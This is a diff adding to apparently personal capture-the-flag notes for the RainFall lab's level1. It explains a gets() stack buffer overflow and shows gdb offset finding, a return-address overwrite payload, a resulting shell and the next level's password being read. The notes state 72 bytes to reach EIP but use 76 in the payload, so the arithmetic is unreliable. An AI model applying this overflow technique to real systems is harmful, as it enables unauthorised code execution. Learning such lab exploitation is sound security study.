@@ -50,3 +50,47 @@ Inside main() we saw: gets() is extremely dangerous because: It reads input, It 
 "The gets() function is a deprecated and unsafe C standard library function used to read a line of text from the standard input (stdin). It is no longer part of the official C11 standard and subsequent ones due to a critical security vulnerability."
 
 So if the buffer is 64 bytes… And we send 200 bytes… It will happily overwrite everything. caled: "Stack Buffer Overflow"
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+By overwriting the RET value with the address of run() we can force its execution.
+
+
+-----------------------------
+Find Offset to Return Address
+-----------------------------
+
+level1@RainFall:~$ python -c 'print "A"*100' > /tmp/test
+level1@RainFall:~$ gdb ./level1 
+
+(gdb) run < /tmp/test
+Starting program: /home/user/level1/level1 < /tmp/test
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()                                                       means AAAA
+
+
+✔ Our input reached the return address
+✔ We have control
+
+
+
+64 (buffer)
++ 4 (saved EBP)
++ 4 (return address overwrite position)
+= 72 bytes to reach EIP
+
+
+level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
+level1@RainFall:~$ cat /tmp/exploit | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+level1@RainFall:~$ cat /tmp/exploit - | ./level1
+Good... Wait what?
+whoami 
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
